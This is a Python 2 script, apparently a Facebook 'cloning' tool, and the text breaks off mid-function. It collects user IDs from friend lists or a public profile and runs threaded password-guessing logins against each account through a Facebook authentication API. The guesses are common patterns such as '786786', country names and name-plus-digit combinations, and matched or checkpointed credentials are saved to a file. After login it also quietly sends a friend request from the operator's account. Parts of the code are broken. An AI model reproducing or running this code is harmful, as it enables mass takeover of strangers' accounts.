#!/usr/bin/python2
#coding=utf-8
#TECH ABM THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#YOUTUBE TECH ABM


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM
#### LOGO ####
logo = """
\033[1;95m _____ _____ _____  _   _    ___  _________  ___
\033[1;97m|_   _|  ___/  __ \| | | |  / _ \ | ___ \  \/  |
\033[1;95m  | | | |__ | /  \/| |_| | / /_\ \| |_/ / .  . |
\033[1;97m  | | |  __|| |    |  _  | |  _  || ___ \ |\/| |
\033[1;95m  | | | |___| \__/\| | | | | | | || |_/ / |  | |
\033[1;97m  \_/ \____/ \____/\_| |_/ \_| |_/\____/\_|  |_/
\033[1;97m>>============================================
\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
\033[1;97m>>============================================
"""
logo2 = """
\033[1;96m        _______        \033[1;93m        _______    
\033[1;96m    .adOOOOOOOOOba.    \033[1;93m     .adOOOOOOOOOba.
\033[1;96m   dOOOOOOOOOOOOOOOb   \033[1;93m    dOOOOOOOOOOOOOOOb 
\033[1;96m  dOOOOOOOOOOOOOOOOOb  \033[1;93m   dOOOOOOOOOOOOOOOOOb
\033[1;96m dOOOOOOOOOOOOOOOOOOOb \033[1;93m  dOOOOOOOOOOOOOOOOOOOb
\033[1;96m|OOOOOOOOOOOOOOOOOOOOO|\033[1;93m |OOOOOOOOOOOOOOOOOOOOO|
\033[1;96mOP'~"YOOOOOOOOOOOP"~`YO\033[1;93m OP'~"YOOOOOOOOOOOP"~`YO
\033[1;96mOO     `YOOOOOP'     OO\033[1;93m OO     `YOOOOOP'     OO 
\033[1;96mOOb   ●  `OOO'  ●   dO\033[1;93m  OOb   ●  `OOO'  ●   dO
\033[1;96mYOOo      OOO      oOOP\033[1;93m YOOo      OOO      oOOP
\033[1;96m`OOOo     OOO     oOOO'\033[1;93m `OOOo     OOO     oOOO'
\033[1;96m `OOOb._,dOOOb._,dOOO' \033[1;93m  `OOOb._,dOOOb._,dOOO'
\033[1;96m  `OOOOOOOOOOOOOOOOO'  \033[1;93m   `OOOOOOOOOOOOOOOOO'
\033[1;96m   OOOOOOOoOoOOOOOOO   \033[1;93m    OOOOOOOoOoOOOOOOO 
\033[1;96m   YOOOOOOOOOOOOOOOP   \033[1;93m    YOOOOOOOOOOOOOOOP
\033[1;96m   `OOOOOI```IOOOOO'   \033[1;93m    `OOOOOI```IOOOOO'
\033[1;96m    `OOOOI,,,IOOOO'    \033[1;93m     `OOOOI,,,IOOOO'   
\033[1;96m     `OOOOOOOOOOO'     \033[1;93m      `OOOOOOOOOOO'
\033[1;97m>>============================================
\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
\033[1;97m>>============================================
"""
logo3 = """
\033[1;94m_¶¶_______________¶¶
\033[1;96m_¶¶_______¶¶¶¶¶¶¶¶¶¶
\033[1;93m__¶¶_____¶¶¶¶¶_¶¶¶¶_
\033[1;94m__¶¶__¶__¶¶___¶_____
\033[1;96m_¶¶¶_¶¶¶_¶¶¶_¶¶¶____
\033[1;94m_¶¶¶_____¶¶¶________
\033[1;93m_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
\033[1;96m__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
\033[1;94m__________¶¶_____¶¶_
\033[1;96m_____¶¶¶__¶¶_¶¶¶_¶¶_
\033[1;93m______¶___¶¶__¶__¶¶_
\033[1;94m__¶¶¶¶¶¶¶¶¶¶_____¶¶_
\033[1;93m¶¶¶¶____¶¶________¶¶
\033[1;97m>>============================================
\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
\033[1;97m>>============================================
"""
logo4 = """
\033[1;94m__________________ ##
\033[1;93m_________________###*
\033[1;94m______________.*#####
\033[1;93m_____________*######
\033[1;94m___________*#######
\033[1;93m__________*########.
\033[1;94m_________*#########.
\033[1;93m_________*#######*##*
\033[1;94m________*#########*###
\033[1;94m_______*##########*__*##
\033[1;93m_____*###########_____*
\033[1;93m____############
\033[1;94m___*##*#########
\033[1;93m___*_____########
\033[1;93m__________#######
\033[1;94m___________*######
\033[1;94m____________*#####*
\033[1;93m______________*####*
\033[1;94m________________*####
\033[1;93m__________________*##*
\033[1;93m____________________*##
\033[1;94m_____________________*##.
\033[1;93m____________________.#####.
\033[1;94m_________________.##########
\033[1;93m________________.####*__*####
\033[1;97m>>============================================
\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
\033[1;97m>>============================================
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;96m «--------------------------------------------»" 
	time.sleep(0.05)
	print "\033[1;97m[1]\033[1;97m Login with Facebook \033[1;97m(\033[1;91mfb login\033[1;97m) "
        time.sleep(0.05)
        print "\033[1;96m «--------------------------------------------»"
        time.sleep(0.05)
        print "\033[1;97m[2]\033[1;97m Login with access token \033[1;97m(\033[1;91mTokenz\033[1;97m)"
        time.sleep(0.05)
	print "\033[1;96m «--------------------------------------------»"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;97m Logout        "
	time.sleep(0.05)
        print "\033[1;96m «--------------------------------------------»"
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option═╬══►\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo2
		print "\033[1;96m «--------------------------------------------»" 
		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		time.sleep(0.05)
		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		print "\033[1;96m «--------------------------------------------»"
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print "\033[1;96m «--------------------------------------------»" 
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo3
	print "\033[1;96m «--------------------------------------------»"
	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;97m ")
	print "\033[1;96m «--------------------------------------------»"
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo4
        print "\033[1;96m «--------------------------------------------»" 
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print "\033[1;96m «--------------------------------------------»"
	time.sleep(0.05)
	print "\033[1;32;98m[1] \033[1;92m>> \033[1;97mCloning From Pakistan " 
        time.sleep(0.05)
	print "\033[1;32;98m[2] \033[1;92m>> \033[1;97mCloning From Bangladesh " 
        time.sleep(0.05)
        print "\033[1;32;98m[3] \033[1;92m>> \033[1;97mCloning From India " 
        time.sleep(0.05)
        print "\033[1;32;98m[4] \033[1;92m>> \033[1;97mCloning From Old Fb Account " 
        time.sleep(0.05)
	print "\033[1;32;98m[0] \033[1;91m>> Log out"
	time.sleep(0.05)
	print "\033[1;96m «--------------------------------------------»" 
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		mafiax()
	elif unikers =="3":
		pakarmy()
	elif unikers =="4":
		hackerz()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»" 
        print( "\x1b[1;32;92m[1] \033[1;33;93m>>\033[1;97m Clone From Friendlist ") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>>\033[1;97m Clone From Public ID ") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;91m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super() 
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m «--------------------------------------------»" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Pakistan') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\x1b[1;97m' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m «--------------------------------------------»"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
def mafiax():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;96m «--------------------------------------------»" 
	print( "\x1b[1;32;92m[1] \033[1;33;93m>>\033[1;97m Crack From Friendlist ") 
	time.sleep(0.05)
	print( "\x1b[1;32;92m[2] \033[1;33;98m>>\033[1;97m Crack From Public ID ") 
	time.sleep(0.05)
	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m «--------------------------------------------»" 
	pilih_mafiax()

def pilih_mafiax():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_mafiax()
        elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		jalan('\033[1;96m[⊱⋕⊰] \033[1;92mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m «--------------------------------------------»"
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading.. "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m «--------------------------------------------»"
	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;91m            Create By : Tech-Abm')
	print "\033[1;97m «--------------------------------------------»"

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = ('Bangladesh') 
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mInvalid_OK\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;97mInvalid_CP\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
